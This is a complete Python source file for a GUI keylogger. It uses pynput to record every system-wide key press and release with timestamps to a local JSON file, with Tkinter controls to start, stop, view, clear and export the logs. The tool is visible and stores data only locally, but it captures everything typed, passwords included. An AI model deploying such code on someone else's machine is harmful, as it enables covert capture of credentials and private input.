import json
import os
import threading
from datetime import datetime
from pynput import keyboard
import tkinter as tk
from tkinter import scrolledtext, messagebox

# JSON file to store keystrokes
JSON_FILE = "keylog.json"

# Initialize or load existing keylog data
def load_keylog():
    if os.path.exists(JSON_FILE):
        with open(JSON_FILE, 'r') as f:
            try:
                return json.load(f)
            except json.JSONDecodeError:
                return {"keystrokes": []}
    return {"keystrokes": []}

# Save keylog data to JSON file
def save_keylog(data):
    with open(JSON_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# Convert JSON keylog to readable TXT file
def convert_json_to_txt():
    """Convert the JSON keylog file to a readable TXT file"""
    if not os.path.exists(JSON_FILE):
        print(f"Error: {JSON_FILE} not found!")
        return
    
    # Load JSON data
    with open(JSON_FILE, 'r') as f:
        data = json.load(f)
    
    # Create TXT filename
    txt_file = JSON_FILE.replace('.json', '.txt')
    
    # Write to TXT file
    with open(txt_file, 'w') as f:
        f.write("=" * 60 + "\n")
        f.write("KEYLOGGER REPORT\n")
        f.write("=" * 60 + "\n\n")
        f.write(f"Total keystrokes recorded: {len(data['keystrokes'])}\n")
        f.write("=" * 60 + "\n\n")
        
        for entry in data['keystrokes']:
            event = entry['event'].upper()
            key = entry['key']
            timestamp = entry['timestamp']
            f.write(f"[{event:7}] {key:20} | {timestamp}\n")
    
    print(f"Converted to {txt_file}")
    return txt_file

# Global keylog data storage
keylog_data = load_keylog()
listener = None
is_running = False

def on_press(key):
    """Function called when a key is pressed"""
    global is_running
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
    
    try:
        # For regular character keys
        key_name = key.char
    except AttributeError:
        # For special keys (e.g., ctrl, shift, etc.)
        key_name = str(key)
    
    # Create entry for key press
    entry = {
        "event": "press",
        "key": key_name,
        "timestamp": timestamp
    }
    
    # Add to keylog data
    keylog_data["keystrokes"].append(entry)
    save_keylog(keylog_data)
    
    # Stop listener if ESC is pressed
    if key == keyboard.Key.esc:
        is_running = False
        return False

def on_release(key):
    """Function called when a key is released"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")
    
    try:
        # For regular character keys
        key_name = key.char
    except AttributeError:
        # For special keys
        key_name = str(key)
    
    # Create entry for key release
    entry = {
        "event": "release",
        "key": key_name,
        "timestamp": timestamp
    }
    
    # Add to keylog data
    keylog_data["keystrokes"].append(entry)
    save_keylog(keylog_data)

def start_keylogger():
    """Start the keylogger in a separate thread"""
    global listener, is_running
    is_running = True
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

def stop_keylogger():
    """Stop the keylogger"""
    global listener, is_running
    is_running = False
    if listener:
        listener.stop()

class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Application")
        self.root.geometry("700x600")
        self.root.configure(bg="#2c3e50")
        
        # Title Label
        title = tk.Label(root, text="🔐 Keylogger Monitor", 
                        font=("Arial", 20, "bold"), 
                        bg="#2c3e50", fg="#ecf0f1")
        title.pack(pady=20)
        
        # Status Frame
        status_frame = tk.Frame(root, bg="#34495e", relief=tk.RIDGE, bd=2)
        status_frame.pack(pady=10, padx=20, fill=tk.X)
        
        self.status_label = tk.Label(status_frame, text="Status: Stopped", 
                                     font=("Arial", 12), 
                                     bg="#34495e", fg="#e74c3c")
        self.status_label.pack(pady=10)
        
        self.count_label = tk.Label(status_frame, text="Keystrokes: 0", 
                                    font=("Arial", 10), 
                                    bg="#34495e", fg="#ecf0f1")
        self.count_label.pack(pady=5)
        
        # Button Frame
        button_frame = tk.Frame(root, bg="#2c3e50")
        button_frame.pack(pady=20)
        
        self.start_btn = tk.Button(button_frame, text="▶ Start Logging", 
                                   command=self.start_logging,
                                   font=("Arial", 12, "bold"),
                                   bg="#27ae60", fg="white",
                                   width=15, height=2,
                                   cursor="hand2")
        self.start_btn.grid(row=0, column=0, padx=10)
        
        self.stop_btn = tk.Button(button_frame, text="⏹ Stop Logging", 
                                  command=self.stop_logging,
                                  font=("Arial", 12, "bold"),
                                  bg="#e74c3c", fg="white",
                                  width=15, height=2,
                                  cursor="hand2",
                                  state=tk.DISABLED)
        self.stop_btn.grid(row=0, column=1, padx=10)
        
        self.convert_btn = tk.Button(button_frame, text="📄 Convert to TXT", 
                                     command=self.convert_to_txt,
                                     font=("Arial", 12, "bold"),
                                     bg="#3498db", fg="white",
                                     width=15, height=2,
                                     cursor="hand2")
        self.convert_btn.grid(row=1, column=0, padx=10, pady=10)
        
        self.view_btn = tk.Button(button_frame, text="👁 View Logs", 
                                  command=self.view_logs,
                                  font=("Arial", 12, "bold"),
                                  bg="#9b59b6", fg="white",
                                  width=15, height=2,
                                  cursor="hand2")
        self.view_btn.grid(row=1, column=1, padx=10, pady=10)
        
        self.clear_btn = tk.Button(button_frame, text="🗑 Clear Logs", 
                                   command=self.clear_logs,
                                   font=("Arial", 12, "bold"),
                                   bg="#e67e22", fg="white",
                                   width=15, height=2,
                                   cursor="hand2")
        self.clear_btn.grid(row=2, column=0, columnspan=2, pady=10)
        
        # Log Display Area
        log_frame = tk.Frame(root, bg="#2c3e50")
        log_frame.pack(pady=10, padx=20, fill=tk.BOTH, expand=True)
        
        tk.Label(log_frame, text="Recent Activity:", 
                font=("Arial", 11, "bold"), 
                bg="#2c3e50", fg="#ecf0f1").pack(anchor=tk.W)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, 
                                                  height=10, 
                                                  font=("Courier", 9),
                                                  bg="#34495e", 
                                                  fg="#ecf0f1",
                                                  insertbackground="white")
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Update counter periodically
        self.update_counter()
        
    def start_logging(self):
        global is_running
        if not is_running:
            start_keylogger()
            self.status_label.config(text="Status: Running", fg="#27ae60")
            self.start_btn.config(state=tk.DISABLED)
            self.stop_btn.config(state=tk.NORMAL)
            self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Keylogger started\n")
            self.log_text.see(tk.END)
    
    def stop_logging(self):
        global is_running
        if is_running:
            stop_keylogger()
            self.status_label.config(text="Status: Stopped", fg="#e74c3c")
            self.start_btn.config(state=tk.NORMAL)
            self.stop_btn.config(state=tk.DISABLED)
            self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Keylogger stopped\n")
            self.log_text.see(tk.END)
    
    def convert_to_txt(self):
        txt_file = convert_json_to_txt()
        if txt_file:
            messagebox.showinfo("Success", f"Converted to {txt_file}")
            self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Converted to TXT\n")
            self.log_text.see(tk.END)
        else:
            messagebox.showerror("Error", "No JSON file found to convert")
    
    def view_logs(self):
        if os.path.exists(JSON_FILE):
            with open(JSON_FILE, 'r') as f:
                data = json.load(f)
                count = len(data['keystrokes'])
                recent = data['keystrokes'][-20:] if data['keystrokes'] else []
                
                self.log_text.delete(1.0, tk.END)
                self.log_text.insert(tk.END, f"=== Recent {len(recent)} keystrokes (out of {count} total) ===\n\n")
                
                for entry in recent:
                    event = entry['event']
                    key = entry['key']
                    timestamp = entry['timestamp']
                    self.log_text.insert(tk.END, f"[{event.upper()}] {key} | {timestamp}\n")
        else:
            messagebox.showwarning("No Logs", "No keystroke logs found yet")
    
    def clear_logs(self):
        global keylog_data
        response = messagebox.askyesno("Confirm Clear", 
                                       "Are you sure you want to clear all logs?")
        if response:
            keylog_data = {"keystrokes": []}
            save_keylog(keylog_data)
            self.log_text.delete(1.0, tk.END)
            self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] All logs cleared\n")
            messagebox.showinfo("Success", "Logs cleared successfully")
    
    def update_counter(self):
        count = len(keylog_data['keystrokes'])
        self.count_label.config(text=f"Keystrokes: {count}")
        self.root.after(1000, self.update_counter)  # Update every second
    
    def on_closing(self):
        global is_running
        if is_running:
            stop_keylogger()
        self.root.destroy()
    
def main():
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.protocol("WM_DELETE_WINDOW", app.on_closing)
    root.mainloop()

if __name__ == "__main__":
    main()
